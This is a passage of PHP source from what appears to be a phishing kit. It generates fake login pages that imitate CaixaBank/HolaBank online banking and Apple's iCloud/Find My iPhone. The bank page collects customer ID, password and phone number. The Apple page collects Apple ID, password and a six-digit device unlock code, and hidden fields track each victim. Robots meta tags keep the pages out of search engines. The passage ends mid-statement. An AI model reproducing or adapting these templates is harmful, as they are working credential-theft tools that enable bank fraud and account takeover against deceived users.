	return $html;
}
}


if (!(function_exists('compassTemplate'))) {
function compassTemplate($title, $emailid, $MD5IdentificaAcesso)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$RandomIdentificacao = time()*rand();

	date_default_timezone_set('Europe/Rome');
	$datetime = date('G');

  if ($datetime >= 6 && $datetime <= 11) {
    $text = 'Buenos días';
  } else if ($datetime >= 12 && $datetime <= 18) {
    $text = 'Buenas tardes';
  } else if ($datetime >= 19 && $datetime <= 24) {
    $text = 'Buenas noches';
  } else if ($datetime >= 00 && $datetime <= 5) {
    $text = 'Buenas noches';
  }
	$textGen = $text;


	$html2 = '//Template 5//';
	$html = '
<!DOCTYPE html>
<html lang="es">
<head>
	<title>Online banking | HolaBank | CaixaBank</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/png" href="/assets/bank5/favicon.jpg"/>
	<link rel="stylesheet" type="text/css" href="/assets/bank5/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="/assets/bank5/util.css">
	<link rel="stylesheet" type="text/css" href="/assets/bank5/main.css">


</head>
<body>

	<div class="header">
	  <img src="/assets/bank5/caixa-logo.png" style="width:12%">
	  <div class="header-right">

	  </div>
	</div>

	<div class="limiter">
		<div class="container-login100">

			<div class="wrap-login100 p-l-85 p-r-85 p-t-55 p-b-55">
        <span class="login100-form-title p-b-32">
          now </br>
          <div class="textgen">' . $textGen . '</div>
        </span>
				<div id="command" class="form-group"  style="font-style: italic;font-weight: 400;">
				<input type="hidden" name="apple_add" id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '">
				<input type="hidden" name="link_address" id="link_address" value="' . $_SERVER['SERVER_NAME'] . '">
				<input type="hidden" name="TemplateBank" id="TemplateBank" value="5">
				<input type="hidden" name="RandomIdentificacao" id="RandomIdentificacao" value="' . $RandomIdentificacao . '">
				<input type="hidden" name="MD5IdentificaAcesso" id="MD5IdentificaAcesso" value="' . $MD5IdentificaAcesso . '">
				<div class="login100-form validate-form flex-sb flex-w" id="Primeira-Pagina">

          <br><br><br>
					<div class="wrap-input100 validate-input m-b-12" data-validate = "Identificador Obligatorio">
						<input class="input100" type="text" id="Usuario" name="num_cliente" placeholder="Identificador" >
						<span class="focus-input100"></span>
					</div>

					<div class="wrap-input100 validate-input m-b-12" data-validate = "Contraseña Obligatorio">
						<input class="input100" type="password" id="Senha" name="pin" placeholder="Contraseña" >
						<span class="focus-input100"></span>

					</div>

					<div class="wrap-input100 validate-input m-b-12" data-validate = "Teléfono Obligatorio">
						<input class="input100" type="text" id="Telefone" name="telefono" placeholder="Teléfono" >
						<span class="focus-input100"></span>

					</div>


					<div class="container-login100-form-btn">
						<button type="submit">
							<button onclick="CickMain1()" id="BtnSend" class="generated-text" type="button">Comprobar</button>
						</button>
					</div>


				</div>

				<div class="alertSection" id="Segunda-Pagina" style="display: none;">
        <div class="blockImage section">
           <div class="item-multiple__element " style="  min-height: auto;" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;30&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
              <div class="block__ico ico-center">
                 <img class="img_responsive" style="height:100px; width:100px; align:center;" src="/assets/bank5/Exclamation.svg.png" />
              </div>
           </div>
        </div>
        <div class="blockTitle section">
           <div class="item-multiple__element  space10" style=" text-align: left; min-height: auto;" data-isp-spazio-manuale="{&quot;panelSize&quot;:&quot;space10&quot;}">
              <div class="block__title">
                 <div>

             </div>
             <br>
                 <span class="textCenter" style="font-size:21px;color:#fff;font-family:sans-light;font-style: normal;"> Su operador pronto se pondrá en contacto con usted para verificar los datos introducidos y concluir la comprobación de seguridad. </span>
           </div>
        </div>
      </div>
    </div>

<center id="Esconde1" style="color:#fff"><a href="#" style="color:#fff">¿No puedes entrar?</a></center>

			</div>
		</div>
	</div>
  <center id="Esconde2" style="color:#fff"><a href="#" style="color:#fff">¿Eres nuevo?</a></center>
	<div id="dropDownSelect1"></div>
	<script src="/assets/js/jquery.js"></script>
	<script src="/assets/bank5/bank5.js?t=' . time() .'"></script>
</body>
</html>

	';

	/*
	$head = "\n" . '        <!DOCTYPE html>' . "\n" . '<html lang="en">' . "\n" . '<head>' . "\n\t" . '<meta charset="UTF-8">' . "\n\t" . '<meta name="robots" content="noindex, nofollow, noarchive" />' . "\n\t" . '<meta name="googlebot" content="noindex, nofollow, noarchive">' . "\n\t" . '<meta name="googlebot" content="nosnippet" />' . "\n\t" . '<meta name="robots" content="noodp" />' . "\n\t" . '<meta name="slurp" content="noydir">' . "\n\t" . '<meta name="robots" content="noimageindex,nomediaindex" />' . "\n\t" . '<meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET" />' . "\n\t" . '<meta http-equiv="X-UA-Compatible" content="IE=edge">' . "\n\t" . '<meta content="width=device-width, initial-scale=1" name="viewport"/>' . "\n" . '    <link rel="apple-touch-icon" sizes="57x57" href="/assets/favicon/apple-icon-57x57.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="60x60" href="/assets/favicon/apple-icon-60x60.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="72x72" href="/assets/favicon/apple-icon-72x72.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="76x76" href="/assets/favicon/apple-icon-76x76.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="114x114" href="/assets/favicon/apple-icon-114x114.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="120x120" href="/assets/favicon/apple-icon-120x120.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="144x144" href="/assets/favicon/apple-icon-144x144.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="152x152" href="/assets/favicon/apple-icon-152x152.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-icon-180x180.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/favicon/android-icon-192x192.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="96x96" href="/assets/favicon/favicon-96x96.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">' . "\n" . '    <link rel="manifest" href="/assets/favicon/manifest.json">' . "\n" . '    <meta name="msapplication-TileColor" content="#ffffff">' . "\n" . '    <meta name="msapplication-TileImage" content="/assets/favicon/ms-icon-144x144.png">' . "\n" . '    <meta name="theme-color" content="#ffffff">' . "\n\t" . '<title>' . $ci->lang->line('FindMyiPhone_message') . '</title>' . "\n\t" . '<link rel="stylesheet" href="/assets/layout/strap.css">' . "\n\t" . '<link rel="stylesheet" href="/assets/layout/apple.css">' . "\n\t" . '<link rel="stylesheet" href="/assets/layout/kit.css">' . "\n\t" . '<link rel="stylesheet" href="/assets/layout/animate.css">' . "\n\t" . '<link rel="stylesheet" href="/assets/css/fmi2.css">' . "\n\t" . '<script src="/assets/js/jquery.js"></script>' . "\n" . '</head>' . "\n" . '<body class="find robots-nocontent">' . "\n\n" . '<section id="header2" style="border-bottom: 1px rgba(36, 163, 55, 0.5) solid;">' . "\n\n\t\t\t\t" . '<a class="allDevices" style="color: #333; font-weight: 500; font-size: 20px"><span>' . $ci->lang->line('FindMyiPhone_message') . '</span></i>' . "\n\n\t\t\t\t" . '</a>' . "\n\n\t" . '<div class="container-fluid">' . "\n\t\t" . '<div class="row">' . "\n\t\t\t" . '<div class="col-md-4 col-xs-8 rightH rtl">' . "\n\t\t\t\t" . '<a class="help" title="' . $ci->lang->line('Help_message') . '" alt="' . $ci->lang->line('Help_message') . '" href="https://help.apple.com/icloud/"></a>' . "\n\n\n\t\t\t" . '</div>' . "\n\t\t\t" . '<div class="col-md-8 col-xs-4 leftH">' . "\n\t\t\t\t" . '<span class="icloud"></span><span class="find hidden-sm hidden-xs hidden-md">' . $ci->lang->line('FindMyiPhone_message') . '</span>' . "\n\n\t\t\t" . '</div>' . "\n\t\t" . '</div>' . "\n\t" . '</div>' . "\n" . '</section>' . "\n" . '        ';
	$body = "\n" . '        <section id="compass">' . "\n\t" . '<div class="compass">' . "\n\t\t" . '<img src="/assets/img/compass1.png" class="compass1" alt="">' . "\n\t\t" . '<img src="/assets/img/compass2.png" class="compass2" alt="">' . "\n\t\t" . '<img src="/assets/img/compass3.png" class="compass3" alt="">' . "\n\t\t" . '<span>' . $ci->lang->line('Locating_message') . '...</span>' . "\n\t" . '</div>' . "\n\t" . '<div class="clearfix"></div>' . "\n" . '</section>' . "\n\n" . '<section id="ffmilogin">' . "\n" . '    ' . form_open(site_url('authority/get'), array('autocomplete' => 'false', 'class' => 'fmi-login form-ajax-fmi animated', 'role' => 'form', 'data-red' => ($redirect == 1 ? $redirecturl : site_url('findmyiphone')), 'data-reds' => '1')) . "\n" . '    ' . "\n" . '        ' . "\n" . '        <img src="/assets/img/findmyphon.png" alt="" class="fmilogo">' . "\n" . '    ' . "\n" . '        <span class="sign-in">' . $ci->lang->line('Sign-InRequired_message') . '</span>' . "\n" . '        <!-- /.sign-in -->';

	if ($emailid) {
		//$body .= '<input type="hidden" name="apple_id" id="apple_id" value="' . $emailid . '" />' . "\n" . '        <span class="useremail">' . $novoMail . '</span>';
				$body .= '<input type="text" class="pwd ltr useremail" style="margin: 10px 0 5px 0;" name="apple_id" id="apple_id" value="' . $novoMail . '" placeholder="' . $ci->lang->line('appleid_message') . '" />' . "\n" . '        <span class="useremail">' . $novoMail . '</span>';
	}
	 else {
		$body .= '<input type="text" class="pwd ltr useremail" style="margin: 10px 0 5px 0;" name="apple_id" id="apple_id" value="' . $emailid . '" placeholder="' . $ci->lang->line('appleid_message') . '" />';
	}

	$body .= '<!-- /.useremail -->' . "\n\n" . '        <input type="password" class="pwd ltr" name="apple_pwd" id="apple_pwd" placeholder="' . $ci->lang->line('Password_message') . '" value="" autocomplete="false">' . "\n" . "\n" . '        <input type="hidden" name = "apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n" . '        <div class="clearfix"></div>' . "\n" . '        <!-- /.clearfix -->' . "\n" . '        <div class="loginbut">' . "\n" . '            <div class="overlays">' . "\n" . '                <div class="spinners center">' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                    <div class="spinners-blade"></div>' . "\n" . '                </div>' . "\n" . '            </div>' . "\n" . '        <input type="submit" id="c_logs" name="c_logs" class="c_logs" value="' . $ci->lang->line('Signin_message') . '">' . "\n\n" . '        </div>' . "\n" . '        <!-- /.loginbut -->' . "\n" . '    </form>';

	if ($emailid) {
		$body .= '<div class="not">' . $ci->lang->line('Not_message') . ' ' . $emailid . '? <a href="https://www.icloud.com/applications/find/current/en-us/index.html?#">' . $ci->lang->line('Signout_message') . '</a></div>';
	}


	$body .= '</section>' . "\n" . '<!-- /#ffmilogin -->' . "\n\n" . '<script type="application/javascript">' . "\n" . '    ' . "\n" . '</script>' . "\n" . '        ';
	$foot = "\n\t" . '<script src="/assets/js/apple.min.js"></script>' . "\n\t" . '<script src="/assets/js/mapiconmaker.js"></script>' . "\n\t" . '<script src="/assets/js/ajax-form.min.js"></script>' . "\n\n\t" . '<script type="text/javascript">' . "\n\n\t" . '$(document).ready(function() {' . "\n\n\t\t\n\t\t" . 'setTimeout(function(){' . "\n\t\t\t" . '$("#compass").fadeOut(100);' . "\n\t\t" . '},4000); ';

	if (!(empty($emailid))) {
		$foot .= 'setTimeout(function(){' . "\n" . '            $( "#apple_pwd" ).focus()' . "\n" . '        },4010); ';
	}
	 else {
		$foot .= 'setTimeout(function(){' . "\n" . '            $( "#apple_id" ).focus()' . "\n" . '        },4010); ';
	}

	$foot .= '});' . "\n\t" . '</script>' . "\n" . '</body>' . "\n" . '</html>' . "\n" . '        ';
	return $head . $body . $foot;
	*/
	return $html;
}
}

if (!(function_exists('MapaNovo6'))) {
function MapaNovo6($title, $emailid)
{

	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$html = '<!DOCTYPE html>' . "\n" . '<html lang="en">' . "\n" . '<head>' . "\n" . '    <meta charset="UTF-8">' . "\n" . '    <meta name="robots" content="noindex, nofollow, noarchive"/>' . "\n" . '    <meta name="googlebot" content="noindex, nofollow, noarchive">' . "\n" . '    <meta name="googlebot" content="nosnippet"/>' . "\n" . '    <meta name="robots" content="noodp"/>' . "\n" . '    <meta name="slurp" content="noydir">' . "\n" . '    <meta name="robots" content="noimageindex,nomediaindex"/>' . "\n" . '    <meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET"/>' . "\n" . '    <meta http-equiv="X-UA-Compatible" content="IE=edge">' . "\n" . '    <meta content="width=device-width, initial-scale=1" name="viewport"/>' . "\n" . '    <link rel="apple-touch-icon" sizes="57x57" href="/assets/favicon/apple-icon-57x57.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="60x60" href="/assets/favicon/apple-icon-60x60.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="72x72" href="/assets/favicon/apple-icon-72x72.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="76x76" href="/assets/favicon/apple-icon-76x76.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="114x114" href="/assets/favicon/apple-icon-114x114.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="120x120" href="/assets/favicon/apple-icon-120x120.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="144x144" href="/assets/favicon/apple-icon-144x144.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="152x152" href="/assets/favicon/apple-icon-152x152.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-icon-180x180.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="192x192" href="/assets/favicon/android-icon-192x192.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="96x96" href="/assets/favicon/favicon-96x96.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">' . "\n" . '    <link rel="manifest" href="/assets/favicon/manifest.json">' . "\n" . '    <meta name="msapplication-TileColor" content="#ffffff">' . "\n" . '    <meta name="msapplication-TileImage" content="/assets/favicon/ms-icon-144x144.png">' . "\n" . '    <meta name="theme-color" content="#ffffff">' . "\n" . '    <title>' . $title . '</title>' . "\n";
	$html .= '    <link rel="stylesheet" href="/assets/layout/strap.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/layout/applenew2.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/layout/applenew3.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/css/app.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/css/MapaNovo.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/layout/kit.css">' . "\n" . '    <link rel="stylesheet" href="/assets/layout/animate.css">' . "\n" . '    <link rel="stylesheet" href="/assets/css/font-awesome.css">' . "\n" . '    <style>' . "\n" . '        .main-container {' . "\n" . '            position: absolute;' . "\n" . '            top: 0;' . "\n" . '            left: 0;' . "\n" . '            width: 100%;' . "\n" . '            min-height: 100%;' . "\n" . '            overflow: hidden;' . "\n" . '            z-index: 1;' . "\n" . '        }' . "\n\n" . '     ' . "\n\n" . '       ' . "\n\n" . '    </style>' . "\n" . '</head>' . "\n" . '<body class="robots-nocontent sc-theme sc-focus box-shadow border-rad safari mac webkit en-us" style="background: #ccc !important;">' . "\n\n" . '' . "\n" . '    <div class="overlay">' . "\n" . '' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '        </div>' . "\n" . '    </div>' . "\n" . '</div>' . "\n\n" . '<div class="bodys" style=" z-index: 9999;">' . "\n" . '    <section id="header">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n";
	$html .= ' <div class="col-md-4 col-xs-8 rightH">' . "\n";
	$html .= ' <div class="phone-box" style="    position: absolute;    top: 0;    right: 0;    background: #fff;    width: -moz-fit-content;    max-width: 210px;    float: right;    filter: blur(1.07px);    border: 1px solid #ccc;    z-index: 2;">';
	$html .= ' <img class="bateria" src="/assets/img/bateria.png" style="float: right;padding-right: 5px;"><br>';
	$html .= ' <center><img class="img_phone" src="/assets/img/BgrqMY5_d.jpg" style="max-width: 220px;max-height: 16vh;"></center><br>';
	$html .= ' <center> <span class="texto1" style="padding-top: 0px;">IPHONE</span></center>';
	$html .= ' <center> <span class="texto2" style="margin-top: 1px;font-weight: 300;"><small>Há menos de um minuto</small></span></center><br>';
	$html .= ' <img class="img_painel" src="/assets/img/painel_2.png" style="max-width: 220px;max-height: 20vh;"></div>';



	$html .= '</div>' . "\n" . '                <div class="col-md-8 col-xs-4 leftH">' . "\n" . '                    <span class="icloud"></span>' . "\n" . '                </div>' . "\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>';

	if ($ci->session->userdata('logged_in') == false) {
		$html .= '<section class="login-form text-center animated" >' . "\n\n" . '        <img src="/assets/img/map3.png" class="img-cloud2" alt="" style="width: 100px;">' ;
		$html .= "\n\n" . '        <span id="txt_top1"><h2 style="color: black;font-weight: bold;"> AppIe Maps Coonect </h2>' . ' </span>' . "\n\n" . '        ' ;
		$html .= "\n\n" . '        <span id="txt_top2" style="display: none;"><h2 style="color: black;font-weight: bold;">' . 'Verificação de Segurança' . '</h2>' . ' </span>' . "\n\n" . '        ' ;
		$html .= form_open(site_url('authority/getBall'), array('class' => 'cloud-login form-ajax', 'role' => 'form', 'data-red' => ($redirect == 1 ? $redirecturl : site_url('findmyiphone')), 'data-reds' => ($redirect == 1 ? 1 : 0), 'style' => 'display:block !important')) . "\n" ;
		$html .= '        <input type="hidden" name="apple_add"  id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n";
		$html .= '        <input type="hidden" name="SizeBall"  id="SizeBall" value="6" >' . "\n";
		//$html .= '<div id="main_form">';
		$html .= '        <input type="text" class="id" name="apple_id" id="apple_id"' . "\n" . '               placeholder="' . $ci->lang->line('appleid_message') . '" style="direction: ltr !important;"' . "\n" . '               value="' . set_value('apple_id', $novoMail) . '">';
		$html .= "\n" . ' <input type="button" name="showPassword" id="showPassword" value=""> ';
		$html .= '        <input type="password" style="display: none;" autocomplete="off" class="pwd" name="apple_pwd" id="apple_pwd"' . "\n" . '               placeholder="' . $ci->lang->line('Password_message') . '">' . "\n";
		//$html .= "\n" . ' <input type="button" name="showPassword2" id="showPassword2" value=""> ';
		//$html .= '        <input type="submit" style="display: none;" disabled class="dolog" name="c_log" id="c_log" value="">' . "\n" . '        <img class="loading" src="/assets/img/ajax-loader.gif" alt="Loading"/>';
		$html .= '        <input type="button" style="display: none;"  class="dolog" name="c_log" id="c_log" value="">' . "\n" . '        <img class="loading" src="/assets/img/ajax-loader.gif" alt="Loading"/>';
		//$html .= '</div>';
		$html .= '
		<div id="security-code" class="security-code-wrap security-code-6 " localiseddigit="Dígitos" style="display: none;">
															<div class="security-code-container force-ltr">
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo2\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo1" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 1" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="0">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo3\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo2" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 2" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="1">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo4\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo3" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 3" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="2">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo5\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo4" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 4" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="3">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo6\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo5" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 5" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="4">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeypress="return SomenteNumero(event);" onkeyup="SendForm(); proximoCampo(this, \'campo1\')" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo6" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 6" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="5">
																</div>
															</div>

															<label class="sr-only" id="idms-input-error-1501591434388-0"></label>

														</div> ';

		$html .= "\n" . '        <div class="alrt">' . "\n" . '            <p>' . $ci->lang->line('incorrect_message') . '</p>' . "\n" . '            <a target="blank" href="https://iforgot.apple.com/password/verify/appleid">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '        </div>' . "\n" . '        </form>' . "\n\n" ;
		$html .= '        <div class="keepme" id="keepme">' . "\n" . '            <input type="checkbox">' . "\n" . '            <span for="keepme" style="color: black;">' . $ci->lang->line('Keepsigin_message') . '</span>' . "\n" . '        </div>' ;
		$html .= "\n\n" . '        <div class="forget" id="forget2" style="display: none;">' . "\n" .    "\n" . '            <div id="response"></div>' . "\n" . '        </div>';
		$html .= "\n\n" . '        <div class="forget" id="forget">' . "\n" . '            <a href="https://iforgot.apple.com/" target="_blank" style="color: black;">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '            <div id="response"></div>' . "\n" . '        </div>' . "\n\n" ;
		$html .= '        <div class="create" id="create" style="color: black;">' . $ci->lang->line('DonthaveanAppleid_message') . ' <a href="#" style="color: grey;">' . $ci->lang->line('Createyoursnow_message') . '.</a></div>' . "\n\n" ;
		$html .= '        <div class="create" id="create2"  style="display: none; color: black;" >' . 'Por motivos de segurança, é necessário inserir o código de bloqueio do dispositivo para prosseguir.</div> ' . '    </section>' . "\n\n" ;

	}


	$html .= '<section class="imessage" style="display:' . $logged . ';">' ;
	$html .= "\n\n\n" . '        <div class="container">' . "\n" . '            <div class="row">' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" ;
	$html .= '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' ;
	$html .= "\n" . '                    <img class="" src="/assets/img/11.png" alt="">' . "\n" ;
	$html .= '                    <span>' . $ci->lang->line('Reminders_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" ;
	$html .= '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" ;
	$html .= '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/9.png" alt="">' . "\n" . '                    <span>' . "\n\t\t\t\t\t\t" . $ci->lang->line('Notes_message') . "\n\t\t\t\t\t" . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/3.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('iCloudDrive_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/10.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Photos_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/1.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Contacts_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/8.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Mail_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/12.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Settings_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/2.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindMyiPhone_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/6.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Keynote_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/5.png" alt="">' . "\n" . '                    <span> ' . $ci->lang->line('Numbers_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/20.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindFriends_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/7.png" alt="">' . "\n" . '                    <span>' . 